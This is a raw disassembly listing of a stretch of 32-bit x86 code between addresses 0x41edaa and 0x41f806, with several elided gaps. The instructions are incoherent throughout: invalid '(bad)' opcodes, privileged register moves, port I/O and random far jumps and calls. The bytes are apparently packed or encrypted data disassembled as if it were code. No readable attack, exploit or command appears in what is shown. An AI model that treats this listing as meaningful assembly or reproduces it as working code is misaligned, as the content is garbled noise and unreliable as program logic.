  41edaa:	les    ebx,FWORD PTR [eax]
  41edac:	cwde   
  41edad:	pusha  
  41edae:	mov    ds:0xd6eaae45,al
  41edb3:	pop    edx
  41edb4:	xchg   edi,eax
  41edb5:	jbe    0x41eda7
  41edb7:	push   ss
  41edb8:	(bad)  
  41edb9:	adc    eax,0xe9c58877
  41edbe:	retf   0xbf3b
  41edc1:	mov    esp,0x5d973243
  41edc6:	das    
  41edc7:	jge    0x41ed5e
  41edc9:	inc    ebx
  41edca:	pop    es
  41edcb:	cwde   
  41edcc:	ret    0x7981
  41edcf:	sub    al,0x12
  41edd1:	xchg   edi,eax
  41edd2:	pop    es
  41edd3:	popa   
  41edd4:	scas   eax,DWORD PTR es:[edi]
  41edd5:	neg    BYTE PTR [edx-0x584fa22f]
  41eddb:	int    0x2b
  41eddd:	and    DWORD PTR [eax],esp
  41eddf:	xchg   ebx,eax
  41ede0:	rcr    esp,1
  41ede2:	lea    ebp,[ecx+edx*1]
  41ede5:	add    ebx,DWORD PTR [ebx]
  41ede7:	enter  0x7370,0x95
  41edeb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41edec:	les    esp,FWORD PTR [ecx]
  41edee:	push   0x31
  41edf0:	mov    ah,0xc7
  41edf2:	imul   ebx,DWORD PTR [eax],0x6d
  41edf5:	iret   
  41edf6:	jmp    0x5f53:0xd6a68629
  41edfd:	jns    0x41ed99
  41edff:	cmc    
  41ee00:	in     eax,0xe6
  41ee02:	mov    bh,0x5b
  41ee04:	fcomip st,st(2)
  41ee06:	int    0x53
  41ee08:	sub    ebx,DWORD PTR [ecx+esi*1]
  41ee0b:	jbe    0x41ed9a
  41ee0d:	jb     0x41edd5
  41ee0f:	mov    dl,0x35
  41ee11:	mov    eax,0x7f55770d
  41ee16:	sbb    DWORD PTR [edx+0x28],edi
  41ee19:	push   ecx
  41ee1a:	rol    ah,0xf3
  41ee1d:	fbstp  TBYTE PTR [edi+0x4545a603]
  41ee23:	jo     0x41ee0a
  41ee25:	shl    BYTE PTR [edi],0x97
  41ee28:	xor    al,0x33
  41ee2a:	cmp    ebx,edx
  41ee2c:	out    dx,eax
  41ee2d:	or     eax,DWORD PTR [edx-0x6a]
  41ee30:	mov    ecx,0x182021dd
  41ee35:	or     al,0xb3
  41ee37:	popa   
  41ee38:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ee39:	sti    
  41ee3a:	iret   
  41ee3b:	lea    eax,ss:0x9b7544af
  41ee42:	shr    edi,cl
  41ee44:	mov    ds:0xc4ac3b49,eax
  41ee49:	addr16 clc 
  41ee4b:	test   edi,esp
  41ee4d:	sbb    al,0x2a
  41ee4f:	shl    bh,1
  41ee51:	cmp    cl,BYTE PTR [eax+0x5fd236de]
  41ee57:	sbb    BYTE PTR ds:0xef24c264,0x59
  41ee5e:	retf   
  41ee5f:	dec    edx
  41ee60:	leave  
  41ee61:	sbb    BYTE PTR [ebx-0x537018e],0x10
  41ee68:	fisubr DWORD PTR [esi-0x80]
  41ee6b:	dec    esp
  41ee6c:	sbb    eax,DWORD PTR cs:[eax]
	...
  41eed3:	add    BYTE PTR [eax],al
  41eed5:	add    BYTE PTR ds:0x7b197956,al
  41eedb:	aas    
  41eedc:	gs pop esi
  41eede:	pop    edx
  41eedf:	repnz call 0x670d:0xa2da18e7
  41eee7:	dec    esp
  41eee8:	add    DWORD PTR [eax],eax
  41eeea:	add    BYTE PTR [ecx],al
  41eeec:	add    BYTE PTR [eax],al
  41eeee:	sub    esp,edi
  41eef0:	dec    esi
  41eef1:	scas   al,BYTE PTR es:[edi]
  41eef2:	in     al,0x32
  41eef4:	dec    edi
  41eef5:	ret    
  41eef6:	shr    dh,0xff
  41eef9:	repz mov eax,ds:0x34bcd84b
  41eeff:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ef01:	out    0x19,eax
  41ef03:	pop    eax
  41ef04:	sub    DWORD PTR [edx+0x2f],esp
  41ef07:	xor    ebp,DWORD PTR [esi-0x6b]
  41ef0a:	xor    DWORD PTR [ebp-0x3a],ecx
  41ef0d:	jmp    0x1e89:0x7b8f7ad6
  41ef14:	cwde   
  41ef15:	scas   eax,DWORD PTR es:[edi]
  41ef16:	mov    bh,0xad
  41ef18:	jge    0x41ef47
  41ef1a:	retf   
  41ef1b:	outs   dx,DWORD PTR ds:[esi]
  41ef1c:	inc    eax
  41ef1d:	jp     0x41eed7
  41ef1f:	mov    ds:0x10f63a53,al
  41ef24:	clc    
  41ef25:	int    0x3b
  41ef27:	ss add eax,0x951c26bf
  41ef2d:	and    ah,ch
  41ef2f:	push   edx
  41ef30:	mov    ebp,DWORD PTR [eax-0x5df4d9e4]
  41ef36:	push   cs
  41ef37:	jne    0x41eee4
  41ef39:	rcl    DWORD PTR [ecx-0x225c3e2a],0x2
  41ef40:	push   esi
  41ef41:	mov    bl,0x82
  41ef43:	push   0xffffffd9
  41ef45:	push   cs
  41ef46:	(bad)
  41ef4b:	jno    0x41eede
  41ef4d:	(bad)  
  41ef4e:	cli    
  41ef4f:	ja     0x41ef54
  41ef51:	mov    ebx,0x37ee1080
  41ef56:	test   al,0x4
  41ef58:	fnstcw WORD PTR [esi+0x1e68c0a6]
  41ef5e:	xchg   edi,eax
  41ef5f:	xchg   ecx,eax
  41ef60:	jne    0x41ef52
  41ef62:	push   es
  41ef63:	ja     0x41efb6
  41ef65:	mov    ds:0xbe64af5b,al
  41ef6a:	cmp    ebx,edx
  41ef6c:	ss dec ebp
  41ef6f:	mov    bh,0x53
  41ef71:	or     edi,edx
  41ef73:	pcmpeqw mm7,QWORD PTR [ebp-0x20]
  41ef77:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ef78:	leave  
  41ef79:	int3   
  41ef7a:	stos   BYTE PTR es:[edi],al
  41ef7b:	out    0x6c,al
  41ef7d:	mov    al,ds:0xc7a9f0b3
  41ef82:	dec    edi
  41ef83:	jp     0x41ef2e
  41ef85:	push   es
  41ef86:	imul   eax,DWORD PTR [ecx-0x12d42de8],0x41425951
  41ef90:	rcr    DWORD PTR [esi],1
  41ef92:	and    dh,BYTE PTR [ecx+0x6e]
  41ef95:	cdq    
  41ef96:	push   eax
  41ef97:	xchg   edx,edx
  41ef99:	cdq    
  41ef9a:	xchg   edi,ebx
  41ef9c:	sub    dh,BYTE PTR [edx-0x412bdd67]
  41efa2:	xchg   ecx,eax
  41efa3:	xor    al,0x9c
  41efa5:	lock inc ebp
  41efa7:	fstp   DWORD PTR [eax-0x3de1c2a4]
  41efad:	call   0xef6a:0xf28893f6
  41efb4:	ins    BYTE PTR es:[edi],dx
  41efb5:	adc    bh,BYTE PTR [eax-0x3603eba9]
  41efbb:	mov    esp,0x3b022da5
  41efc0:	mov    ecx,esi
  41efc2:	xchg   esi,eax
  41efc3:	scas   al,BYTE PTR es:[edi]
  41efc4:	icebp  
  41efc5:	aaa    
  41efc6:	enter  0x756,0x10
  41efca:	mov    bh,0x13
  41efcc:	cdq    
  41efcd:	rcl    edx,cl
  41efcf:	mov    edi,0x155a4cd0
  41efd4:	mov    bh,0xb
  41efd6:	dec    edi
  41efd7:	mov    ds:0x9279dcef,al
  41efdc:	xchg   esp,eax
  41efdd:	lahf   
  41efde:	int    0x9a
  41efe0:	mov    al,0xc8
  41efe2:	pop    ds
  41efe3:	inc    ebp
  41efe4:	bound  ebx,QWORD PTR [edx-0x33]
  41efe7:	jg     0x41efbd
  41efe9:	imul   ebx,DWORD PTR [eax],0xffffffc5
  41efec:	outs   dx,BYTE PTR es:[esi]
	...
  41f056:	mov    ecx,0xff25bf5d
  41f05b:	out    0xbb,eax
  41f05d:	fisttp QWORD PTR [ecx+0x0]
  41f060:	lock imul ebp,DWORD PTR [esi+0x678803c8],0x4d
  41f068:	add    DWORD PTR [eax],eax
  41f06a:	add    BYTE PTR [ecx],al
  41f06c:	add    BYTE PTR [eax],al
  41f06e:	adc    esi,DWORD PTR [eax+edx*8-0x1874e6e9]
  41f075:	int3   
  41f076:	xchg   BYTE PTR [ebx-0x2f],cl
  41f079:	inc    esp
  41f07a:	cmc    
  41f07b:	cmp    BYTE PTR [edi+0x4eb185a7],ah
  41f081:	fnstsw WORD PTR [esi+ebx*8+0x1abb0630]
  41f088:	push   ecx
  41f089:	sub    edx,eax
  41f08b:	fsub   QWORD PTR [edi-0x36]
  41f08e:	mov    edx,0x9a6de4a6
  41f093:	xor    al,0x38
  41f095:	test   DWORD PTR [ebx],eax
  41f097:	loop   0x41f10b
  41f099:	xor    esi,DWORD PTR [edx-0x4]
  41f09c:	pop    edx
  41f09d:	ror    DWORD PTR [eax],cl
  41f09f:	iret   
  41f0a0:	sbb    DWORD PTR [edx-0x41423bb9],ecx
  41f0a6:	int    0xae
  41f0a8:	cmp    BYTE PTR [edi-0x4d4c486d],0xec
  41f0af:	xchg   edi,eax
  41f0b0:	fdiv   QWORD PTR [edx-0x4f]
  41f0b3:	test   al,0xec
  41f0b5:	mov    edi,0x83503f37
  41f0ba:	in     al,dx
  41f0bb:	or     BYTE PTR [edi-0x6be5af7],cl
  41f0c1:	push   0xffffffc6
  41f0c3:	adc    DWORD PTR [edx+0x25],edi
  41f0c6:	call   0x396c:0x5605228f
  41f0cd:	test   al,0x8d
  41f0cf:	lahf   
  41f0d0:	sbb    al,0xd7
  41f0d2:	sub    eax,0x5f504d38
  41f0d7:	js     0x41f140
  41f0d9:	inc    esp
  41f0da:	lea    ebx,[esi-0x62]
  41f0dd:	cs pop edi
  41f0df:	pop    edi
  41f0e0:	iret   
  41f0e1:	xlat   BYTE PTR ds:[ebx]
  41f0e2:	icebp  
  41f0e3:	lock ret 0xeed4
  41f0e7:	cli    
  41f0e8:	mov    fs,ecx
  41f0ea:	jl     0x41f121
  41f0ec:	xor    al,0xa7
  41f0ee:	mov    ds:0x2d732e88,al
  41f0f3:	cmp    BYTE PTR [ecx+esi*2-0x2],cl
  41f0f7:	push   edi
  41f0f8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f0f9:	pop    eax
  41f0fa:	xor    eax,0xf5ce0cf7
  41f0ff:	sbb    eax,DWORD PTR [ecx]
  41f101:	or     BYTE PTR [ebp+0xc],dh
  41f104:	and    al,0x9a
  41f106:	in     al,dx
  41f107:	mov    DWORD PTR [ebp-0x49],esi
  41f10a:	xor    dl,BYTE PTR [ebp+eiz*8+0x1dced1a7]
  41f111:	mov    bl,0x1b
  41f113:	movntq (bad),mm5
  41f114:	out    0xeb,eax
  41f116:	xlat   BYTE PTR ds:[ebx]
  41f117:	sub    DWORD PTR [edx+0x6e],ecx
  41f11a:	and    al,0x65
  41f11c:	pop    edx
  41f11d:	outs   dx,DWORD PTR ds:[esi]
  41f11e:	je     0x41f17d
  41f120:	es push ebp
  41f122:	jne    0x41f10a
  41f124:	or     esi,DWORD PTR [edx]
  41f126:	test   eax,0x9ebf809f
  41f12b:	inc    edx
  41f12c:	in     al,0xc3
  41f12e:	jno    0x41f1af
  41f130:	aad    0x1d
  41f132:	mov    bl,ah
  41f134:	jge    0x41f0de
  41f136:	jae    0x41f114
  41f138:	cmp    BYTE PTR [esi+0x2b],ah
  41f13b:	clc    
  41f13c:	icebp  
  41f13d:	push   edi
  41f13e:	out    dx,eax
  41f13f:	inc    edi
  41f140:	fucomip st,st(7)
  41f142:	xchg   edi,eax
  41f143:	sahf   
  41f144:	push   cs
  41f145:	cli    
  41f146:	or     al,0x38
  41f149:	stc    
  41f14a:	je     0x41f155
  41f14c:	jge    0x41f140
  41f14e:	fwait
  41f14f:	mov    edi,0xcf459b13
  41f154:	pop    edx
  41f155:	dec    esp
  41f156:	or     ah,bl
  41f158:	imul   ecx,DWORD PTR [eax+edi*8+0x79],0xffffffa8
  41f15d:	inc    edx
  41f15e:	inc    ebp
  41f15f:	push   ecx
  41f160:	jge    0x41f150
  41f162:	outs   dx,BYTE PTR ds:[esi]
  41f163:	in     al,0x83
  41f165:	or     eax,0x64442a4a
  41f16a:	(bad)  
  41f16c:	sbb    DWORD PTR [edi],0x0
	...
  41f1d6:	fild   QWORD PTR [edx+ebp*1+0x6c]
  41f1db:	mov    ebx,0x3824ffdf
  41f1e0:	(bad)  
  41f1e1:	jmp    0x4e67:0xac9dc43a
  41f1e8:	add    DWORD PTR [eax],eax
  41f1ea:	add    BYTE PTR [ecx],al
  41f1ec:	add    BYTE PTR [eax],al
  41f1ee:	jb     0x41f1c6
  41f1f0:	ins    DWORD PTR es:[edi],dx
  41f1f1:	xchg   esi,eax
  41f1f2:	mov    ds:0x253a43dc,al
  41f1f7:	icebp  
  41f1f8:	and    DWORD PTR [edx+0x3a],ebx
  41f1fb:	fdivr  QWORD PTR [ecx]
  41f1fd:	popf   
  41f1fe:	jp     0x41f18b
  41f200:	mov    eax,0xb248a2cd
  41f205:	add    BYTE PTR ds:0x459f79f6,ah
  41f20b:	fisttp DWORD PTR [ebp-0x5a]
  41f20e:	repnz dec edx
  41f210:	dec    edi
  41f211:	mov    ecx,0x6850f65
  41f216:	mov    eax,ds:0x94620233
  41f21b:	scas   eax,DWORD PTR es:[edi]
  41f21c:	sub    ah,0xc0
  41f21f:	or     bh,BYTE PTR [edi]
  41f221:	jmp    0x41f240
  41f223:	mov    ebx,DWORD PTR [ebp+0x7]
  41f226:	push   edi
  41f227:	imul   ecx,DWORD PTR [edx+0x29],0xffffff9c
  41f22b:	pop    ebx
  41f22c:	jmp    0xcf41:0x3315ff66
  41f233:	das    
  41f234:	aam    0x5f
  41f236:	jle    0x41f210
  41f238:	sbb    ebx,DWORD PTR [ebp-0x7c53858a]
  41f23e:	ja     0x41f1f5
  41f240:	ret    0xebd2
  41f243:	mov    bh,0xe8
  41f245:	enter  0xc571,0xc6
  41f249:	retf   
  41f24a:	mov    bl,0x1e
  41f24c:	mov    bh,0x47
  41f24e:	mov    eax,0xe533b9b2
  41f253:	push   edx
  41f254:	dec    edi
  41f255:	xor    al,0x3e
  41f257:	aam    0x24
  41f259:	xor    DWORD PTR [eax+0x36],0xffffffe7
  41f25d:	jle    0x41f1e5
  41f25f:	sub    BYTE PTR [ebx-0x5ad610d7],0xbe
  41f266:	in     al,0x7e
  41f268:	stos   BYTE PTR es:[edi],al
  41f269:	(bad)  
  41f26b:	cwde   
  41f26c:	or     ch,0x58
  41f26f:	xchg   ebp,eax
  41f270:	out    dx,eax
  41f271:	dec    ecx
  41f272:	das    
  41f273:	clc    
  41f274:	imul   esp,edi,0x66086131
  41f27a:	fwait
  41f27b:	sub    eax,DWORD PTR [eax+0x4a]
  41f27e:	aaa    
  41f27f:	jne    0x41f296
  41f281:	jbe    0x41f2b7
  41f283:	loopne 0x41f20a
  41f285:	inc    eax
  41f286:	fdivp  st(2),st
  41f288:	sbb    dl,ch
  41f28a:	pop    ecx
  41f28b:	xchg   esi,ecx
  41f28d:	xchg   ebx,eax
  41f28e:	jae    0x41f2f8
  41f290:	retf   0xee50
  41f293:	cmp    al,0x43
  41f295:	sahf   
  41f296:	sbb    al,0xb
  41f298:	loop   0x41f2fb
  41f29a:	jecxz  0x41f27c
  41f29c:	sub    ah,BYTE PTR [edx+edi*1]
  41f29f:	sti    
  41f2a0:	mov    DWORD PTR [edi+ebp*8],eax
  41f2a3:	daa    
  41f2a4:	mov    al,ds:0x90a46ab1
  41f2a9:	push   ecx
  41f2aa:	cmp    al,0x34
  41f2ac:	retf   
  41f2ad:	in     eax,0x6f
  41f2af:	retf   
  41f2b0:	dec    ebx
  41f2b1:	mov    cr1,ebx
  41f2b4:	mov    eax,ds:0xa1ca9ef0
  41f2b9:	mov    WORD PTR [edx],?
  41f2bb:	loopne 0x41f29f
  41f2bd:	iret   
  41f2be:	adc    BYTE PTR [ecx],bh
  41f2c0:	inc    edi
  41f2c1:	aaa    
  41f2c2:	pop    edi
  41f2c3:	lods   eax,DWORD PTR ds:[esi]
  41f2c4:	call   0x9f6a:0x49f3425
  41f2cb:	div    DWORD PTR [edi+0x402f6d32]
  41f2d1:	imul   esi,DWORD PTR [ebx+0x37206ab1],0xffffffcc
  41f2d8:	sbb    eax,0xc4a22bbb
  41f2dd:	cmp    BYTE PTR [ecx-0x24],bh
  41f2e0:	mov    bl,0xdd
  41f2e2:	loop   0x41f2ee
  41f2e4:	ja     0x41f2f3
  41f2e6:	inc    ebp
  41f2e7:	test   DWORD PTR [eax+0xc],eax
  41f2ea:	les    esp,FWORD PTR [ecx+esi*2+0x27]
	...
  41f355:	add    BYTE PTR [ecx+0x1b],dl
  41f358:	jmp    DWORD PTR [esi-0x1]
  41f35b:	out    0xd9,al
  41f35d:	aas    
  41f35e:	jo     0x41f34d
  41f360:	sahf   
  41f361:	jb     0x41f329
  41f363:	fisttp WORD PTR [ebx-0x2c]
  41f366:	addr16 dec edi
  41f368:	add    DWORD PTR [eax],eax
  41f36a:	add    BYTE PTR [ecx],al
  41f36c:	add    BYTE PTR [eax],al
  41f36e:	ss xchg esp,eax
  41f370:	dec    edi
  41f371:	pop    edx
  41f372:	pop    eax
  41f373:	pop    edi
  41f374:	cwde   
  41f375:	dec    ecx
  41f376:	ds push eax
  41f378:	js     0x41f3bd
  41f37a:	sub    dl,BYTE PTR [ebx]
  41f37c:	mov    ecx,0xdf6850d1
  41f381:	test   BYTE PTR [edi+0x520757f],bl
  41f387:	pusha  
  41f388:	test   BYTE PTR ds:0xdeadbadd,al
  41f38e:	jne    0x41f323
  41f390:	es xor eax,0xf935e236
  41f396:	cmc    
  41f397:	ror    BYTE PTR [ebx-0x3cb8e990],0x7c
  41f39e:	std    
  41f39f:	add    eax,DWORD PTR [eax+0x7716a4d7]
  41f3a5:	push   esi
  41f3a6:	inc    ebp
  41f3a7:	fdiv   DWORD PTR [ebp-0x7af1991a]
  41f3ad:	or     ecx,DWORD PTR [ebx+0x40]
  41f3b0:	sbb    edx,DWORD PTR [esi-0x4e]
  41f3b3:	or     eax,0x8665cd94
  41f3b8:	xchg   ebp,eax
  41f3b9:	mov    bl,0x10
  41f3bb:	inc    edx
  41f3bc:	mov    bh,0xbc
  41f3be:	add    BYTE PTR [esi],bl
  41f3c0:	sub    BYTE PTR [ecx-0x1e],bl
  41f3c3:	lds    ecx,FWORD PTR [esi+0x2408edee]
  41f3c9:	std    
  41f3ca:	sub    eax,0x5c76c528
  41f3cf:	(bad)  
  41f3d0:	lock fstp TBYTE PTR [ecx]
  41f3d3:	jmp    0x41f44d
  41f3d5:	cdq    
  41f3d6:	dec    ebp
  41f3d7:	inc    ecx
  41f3d8:	ror    BYTE PTR [ebp+ebx*4-0x74],0xb6
  41f3dd:	sbb    ebx,DWORD PTR [edx-0x6f3065e2]
  41f3e3:	(bad)  
  41f3e4:	out    0x2e,eax
  41f3e6:	dec    eax
  41f3e7:	lds    edx,FWORD PTR [eax+ecx*8+0x11b7dde0]
  41f3ee:	cmp    BYTE PTR [ecx+0xab97cc9],ah
  41f3f4:	stos   DWORD PTR es:[edi],eax
  41f3f5:	test   eax,0x2c14791a
  41f3fa:	pushf  
  41f3fb:	mov    eax,0xddf7bfe6
  41f400:	adc    BYTE PTR [eax+0x36896554],dh
  41f406:	mov    esp,0xf66af037
  41f40b:	ror    BYTE PTR [eax+0x8664572],0x47
  41f412:	out    dx,al
  41f413:	xor    eax,DWORD PTR [ecx+0x10818d28]
  41f419:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f41a:	sub    dh,al
  41f41c:	sub    DWORD PTR ds:0xed28844e,ebp
  41f422:	(bad)  
  41f423:	mov    ds:0xfbbec2ae,al
  41f428:	cs sahf 
  41f42a:	push   esp
  41f42b:	xor    eax,0x6a41a0a3
  41f430:	sbb    DWORD PTR [ebp+0x4523997f],edi
  41f436:	or     bh,BYTE PTR [edi]
  41f438:	shr    DWORD PTR [ecx+eax*1+0x25],1
  41f43c:	lock or dl,BYTE PTR [eax-0xb]
  41f440:	and    eax,0xe39d2074
  41f445:	mov    cl,dh
  41f447:	ins    DWORD PTR es:[edi],dx
  41f448:	(bad)  
  41f449:	iret   
  41f44a:	out    dx,al
  41f44b:	xchg   ecx,eax
  41f44c:	mov    ah,0x15
  41f44e:	cmp    edi,0xd36685a
  41f454:	sbb    DWORD PTR [edx+esi*1-0x75bc6bb3],0xe890a529
  41f45f:	xor    ebx,edi
  41f461:	test   DWORD PTR [edi],0xb21ebecf
  41f467:	mov    ebp,0xb5713f46
  41f46c:	test   DWORD PTR [eax],esi
	...
  41f4d6:	cmp    al,0xe7
  41f4d8:	imul   ebp,edi,0xfffffffb
  41f4db:	out    dx,eax
  41f4dc:	mov    esp,0xd5fd13f7
  41f4e1:	mov    ch,0xad
  41f4e3:	or     eax,DWORD PTR [ebx]
  41f4e5:	jnp    0x41f54e
  41f4e7:	push   eax
  41f4e8:	add    DWORD PTR [eax],eax
  41f4ea:	add    BYTE PTR [ecx],al
  41f4ec:	add    BYTE PTR [eax],al
  41f4ee:	push   0xd1552c21
  41f4f3:	xchg   DWORD PTR [eax],esp
  41f4f5:	enter  0xb530,0x1b
  41f4f9:	mov    eax,0x65568a5a
  41f4fe:	mov    ebp,0x14c8f44
  41f503:	shr    BYTE PTR [ecx],1
  41f505:	test   eax,0x2605d6a0
  41f50a:	pushf  
  41f50b:	dec    eax
  41f50c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f50d:	adc    ebp,DWORD PTR [eax+0x63462ddb]
  41f513:	arpl   WORD PTR [ebx-0x10ba16f7],bp
  41f519:	rcr    DWORD PTR cs:[esi],1
  41f51c:	adc    DWORD PTR [edx+esi*2-0x51],ebp
  41f520:	repnz and al,0xfc
  41f523:	xlat   BYTE PTR ds:[ebx]
  41f524:	in     eax,dx
  41f525:	or     eax,0xc701b8c3
  41f52a:	push   edx
  41f52b:	push   ecx
  41f52c:	js     0x41f58d
  41f52e:	inc    edx
  41f52f:	adc    eax,0x7ec20f02
  41f534:	shl    DWORD PTR [edx-0x3],cl
  41f537:	inc    ecx
  41f538:	ficom  DWORD PTR [ecx+0x58]
  41f53b:	inc    eax
  41f53c:	pop    edi
  41f53d:	test   al,0x5a
  41f53f:	outs   dx,DWORD PTR ds:[esi]
  41f540:	add    al,0x6b
  41f542:	sbb    bl,al
  41f544:	mov    esi,0xe007fa2c
  41f549:	push   ss
  41f54a:	sbb    bl,BYTE PTR [edi-0x6f112b2e]
  41f550:	and    BYTE PTR [ecx+0x4f50e73e],ah
  41f556:	mov    ebp,0xc0e5f8c1
  41f55b:	dec    ebp
  41f55c:	push   esp
  41f55d:	nop
  41f55e:	out    0x82,eax
  41f560:	(bad)  
  41f561:	dec    edx
  41f562:	loop   0x41f5b0
  41f564:	push   ebp
  41f565:	fmul   QWORD PTR [eax+0x67]
  41f568:	shr    DWORD PTR ds:0xb3cd266,cl
  41f56e:	cmp    BYTE PTR [ecx-0xa],ah
  41f571:	jae    0x41f565
  41f573:	fs fs push ebx
  41f576:	les    esi,FWORD PTR [edi+0x6ad5e1cc]
  41f57c:	adc    edx,DWORD PTR [edi]
  41f57e:	or     bl,al
  41f580:	mov    edx,0xd4f513ca
  41f585:	adc    eax,0xf900ba53
  41f58a:	ror    BYTE PTR [edi-0x10b5b5cc],cl
  41f590:	push   ss
  41f591:	or     al,bl
  41f593:	inc    edi
  41f594:	push   ebx
  41f595:	ror    DWORD PTR [bx+si+0x5b40],1
  41f59a:	stos   BYTE PTR es:[edi],al
  41f59b:	lds    eax,FWORD PTR [edx-0x14]
  41f59e:	fs xchg edx,eax
  41f5a0:	or     ebp,DWORD PTR [edi]
  41f5a2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f5a3:	dec    edi
  41f5a4:	xchg   BYTE PTR [ecx],dl
  41f5a6:	es sahf 
  41f5a8:	dec    eax
  41f5a9:	push   esp
  41f5aa:	imul   eax,edx,0xd07b9cf0
  41f5b0:	out    0xf,eax
  41f5b2:	arpl   WORD PTR [edi+eiz*4+0x639cc9e2],cx
  41f5b9:	push   cs
  41f5ba:	mov    bh,0xd6
  41f5bc:	loopne 0x41f58c
  41f5be:	adc    eax,0x7bf287f0
  41f5c3:	mov    bl,0x2b
  41f5c5:	push   ds
  41f5c6:	push   ebp
  41f5c7:	sub    al,0x56
  41f5c9:	mov    ecx,0xae8dc74f
  41f5ce:	call   0xf1c49035
  41f5d3:	shr    BYTE PTR [esi],0xd7
  41f5d6:	mov    edx,DWORD PTR [esi+esi*2+0x1a069283]
  41f5dd:	(bad)  
  41f5de:	or     al,0x48
  41f5e0:	and    ah,BYTE PTR [edi+0xa]
  41f5e3:	fiadd  WORD PTR [edx-0x55f0e59c]
  41f5e9:	fistp  QWORD PTR [ebx+0xfe2434]
	...
  41f653:	add    BYTE PTR [eax],al
  41f655:	add    BYTE PTR [eax+0x34],bh
  41f658:	add    bh,bl
  41f65a:	dec    esi
  41f65b:	(bad)  
  41f65c:	stc    
  41f65d:	mov    bh,0xb7
  41f65f:	jmp    0x207c:0x1d36d422
  41f666:	addr16 push ecx
  41f668:	add    DWORD PTR [eax],eax
  41f66a:	add    BYTE PTR [ecx],al
  41f66c:	add    BYTE PTR [eax],al
  41f66e:	ficom  DWORD PTR [esi+esi*1]
  41f671:	into   
  41f672:	mov    ecx,0x6b05214a
  41f677:	or     ah,BYTE PTR [edi+0xa0907f0]
  41f67d:	mov    edi,0x2c8da079
  41f682:	fdivr  DWORD PTR [esi]
  41f684:	call   0x913745d
  41f689:	scas   al,BYTE PTR es:[edi]
  41f68a:	cli    
  41f68b:	jg     0x41f6d1
  41f68d:	push   0x3
  41f68f:	jle    0xb8a25641
  41f695:	ins    BYTE PTR es:[edi],dx
  41f696:	lahf   
  41f697:	mov    DWORD PTR [edx],ebp
  41f699:	or     BYTE PTR [eax+0x71],bh
  41f69c:	mov    dl,0x82
  41f69e:	push   ds
  41f69f:	push   eax
  41f6a0:	mov    edx,DWORD PTR [eax+0x64224eca]
  41f6a6:	add    eax,0x5101ee2e
  41f6ab:	cmc    
  41f6ac:	or     ebx,DWORD PTR [edi-0x3d]
  41f6af:	or     al,BYTE PTR [ecx-0x40]
  41f6b2:	cmp    eax,0x4cfbb157
  41f6b7:	rcl    edx,1
  41f6b9:	int3   
  41f6ba:	jb     0x41f662
  41f6bc:	xchg   esp,eax
  41f6bd:	mov    ds:0x184b4e47,eax
  41f6c2:	rcl    eax,0xdd
  41f6c5:	mov    bl,0x46
  41f6c7:	call   0x41c1:0x2115bed6
  41f6ce:	sbb    esi,edx
  41f6d0:	jbe    0x41f6dd
  41f6d2:	out    0x3c,al
  41f6d4:	adc    ecx,DWORD PTR [esi-0x103407d0]
  41f6da:	jnp    0x41f672
  41f6dc:	xchg   edi,eax
  41f6dd:	inc    edi
  41f6de:	in     eax,0x83
  41f6e0:	popf   
  41f6e1:	dec    edi
  41f6e2:	ret    0x57d6
  41f6e5:	nop
  41f6e6:	lea    edi,[ebx+0x69]
  41f6e9:	div    DWORD PTR [edx]
  41f6eb:	bound  edi,QWORD PTR fs:[ecx+0x1e3bfd2e]
  41f6f2:	xor    eax,0x77d2e26c
  41f6f7:	hlt    
  41f6f8:	ds repnz push ds
  41f6fb:	retf   
  41f6fc:	cmc    
  41f6fd:	call   0x6f74:0x52eed7b0
  41f704:	neg    cl
  41f706:	fwait
  41f707:	loope  0x41f742
  41f709:	jle    0x41f6f3
  41f70b:	jecxz  0x41f77d
  41f70d:	cdq    
  41f70e:	jmp    0x41f6ab
  41f710:	rol    BYTE PTR [ebx],cl
  41f712:	cli    
  41f713:	fs jae 0x41f6b7
  41f716:	jmp    0x588d2b6a
  41f71b:	fwait
  41f71c:	rcl    DWORD PTR [ebx+0x453c4b57],1
  41f722:	dec    ebx
  41f723:	sar    BYTE PTR [esi+0x3d],1
  41f726:	int3   
  41f727:	les    esi,FWORD PTR [edi-0x55]
  41f72a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f72b:	(bad)  
  41f72d:	in     eax,0x43
  41f72f:	sub    DWORD PTR [edi],ebp
  41f731:	push   0xffffffa6
  41f733:	mov    ebp,0x66d6610d
  41f738:	add    DWORD PTR [ebp-0xa],0x51
  41f73c:	loope  0x41f6c2
  41f73e:	xlat   BYTE PTR ds:[ebx]
  41f73f:	and    BYTE PTR [edi+0x27],ah
  41f742:	lods   al,BYTE PTR ds:[esi]
  41f743:	add    BYTE PTR [ebp+0x7ffbe2e4],0x41
  41f74a:	pop    edi
  41f74b:	sbb    al,0xa7
  41f74d:	pop    edx
  41f74e:	shr    esi,cl
  41f750:	in     al,dx
  41f751:	leave  
  41f752:	inc    esi
  41f753:	outs   dx,DWORD PTR ds:[esi]
  41f754:	xor    DWORD PTR [edx-0x6762e8df],eax
  41f75a:	fs test eax,0x7d0a117e
  41f760:	dec    esp
  41f761:	sbb    ah,bh
  41f763:	or     al,0xa9
  41f765:	inc    edi
  41f766:	fs pop ecx
  41f768:	jmp    0xcd:0xf7076910
	...
  41f7d3:	add    BYTE PTR [eax],al
  41f7d5:	add    BYTE PTR [edx-0x5081dcc4],dl
  41f7db:	jg     0x41f7bc
  41f7dd:	cld    
  41f7de:	call   0x520b:0xd86c62d2
  41f7e5:	dec    esp
  41f7e6:	addr16 push edx
  41f7e8:	add    DWORD PTR [eax],eax
  41f7ea:	add    BYTE PTR [ecx],al
  41f7ec:	add    BYTE PTR [eax],al
  41f7ee:	aad    0x3e
  41f7f0:	sub    al,BYTE PTR [ecx+0x32ee50ad]
  41f7f6:	push   esp
  41f7f7:	jns    0x41f7da
  41f7f9:	jae    0x41f7ff
  41f7fb:	sti    
  41f7fc:	test   BYTE PTR [ecx+edi*4+0x1b],0xcd
  41f801:	xchg   edx,eax
  41f802:	fist   WORD PTR [ebp-0x2a]
  41f805:	pop    ds
  41f806:	add    esi,edi
